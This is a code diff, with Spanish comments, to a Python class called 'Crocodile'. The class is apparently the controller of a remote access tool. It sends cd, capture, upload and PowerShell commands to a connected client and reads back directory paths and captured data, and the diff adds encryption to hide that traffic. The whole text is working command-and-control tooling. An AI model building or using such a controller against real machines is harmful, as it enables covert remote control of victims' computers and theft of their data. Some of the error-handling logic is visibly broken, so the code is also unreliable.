@@ -29,13 +29,15 @@ class Crocodile:
                 if command.lower() == "exit":
                     break
                 elif command.startswith("cd"):
-                    res = command.encode('utf-8')
-                    writer.write(res)
+                    Encript = self.encryptor.encrypt(command)
+                    writer.write(Encript)
                     resp = await reader.read(1024)
-                    current_dir = resp.decode()
+                    decrypted_response = self.encryptor.decrypt(resp)
+                    current_dir = decrypted_response.decode()
                     print(current_dir)
                 elif command.startswith("capture"):
-                    writer.write(command.encode('utf-8'))
+                    Encript = self.encryptor.encrypt(command)
+                    writer.write(Encript)
                     try:
                         # Leer header con longitud
                         header = await reader.readexactly(4)
@@ -69,12 +71,41 @@ class Crocodile:
                         # Enviar confirmación
                         writer.write(b"OK")
                         await writer.drain()
-                        writer.write(b"pwd")
                         resp = await reader.read(1024)
                         current_dir = resp.decode()
                     except Exception as e:
                         writer.write(b"FAIL")
                         await writer.drain()
+                elif command.startswith("cls") or command.startswith("clear"):
+                    os.system('cls')
+                    continue
+                elif command.startswith("upload"):
+                    print("subiendo archivo, este proceso no se encuentra terminado, usa el comando de Powershell")
+                    if os.path.isfile(command[7:]):
+                        print("ruta:",command[7:])
+                    else:
+                        print(f"ruta {command[7:]} no existe")
+                    continue
+                elif command.startswith("powershell"):
+                    print("Abriendo PowerShell")
+                    Encript = self.encryptor.encrypt(command)
+                    writer.write(Encript)
+                    resPower = await reader.read(1024)
+                    decrypted_response = self.encryptor.decrypt(resPower)
+                    validar =  decrypted_response.decode()
+                    if validar == "Comando invalido":
+                        print("comando invalido")
+                        continue
+                    print(validar)
+
+                    encript_ok = self.encryptor.encrypt("OK")
+                    writer.write(encript_ok)
+                    await writer.drain()
+
+                    resp = await reader.read(1024)
+                    decrypted_resp = self.encryptor.decrypt(resp)
+                    current_dir = decrypted_resp.decode()
+                    continue
                 else:
                     res= command.encode('utf-8')
                     writer.write(res)
@@ -83,7 +114,7 @@ class Crocodile:
                     writer.write(b"pwd")
                     resp2 = await reader.read(1024)
                     current_dir = resp2.decode()
-                if not resp:
+                if not resp and resp == "":
                     print("🔴 El cliente cerró la conexión.")
                     break
                     
@@ -91,7 +122,7 @@ class Crocodile:
             except Exception as e:
                 print("ocurrio un error", e)
                 if( str(e).find("El nombre de red especificado ya no está disponible")):
-                    break
+                    continue
         
     async def get_input(self,prompt: str):
         return await asyncio.to_thread(input, prompt)
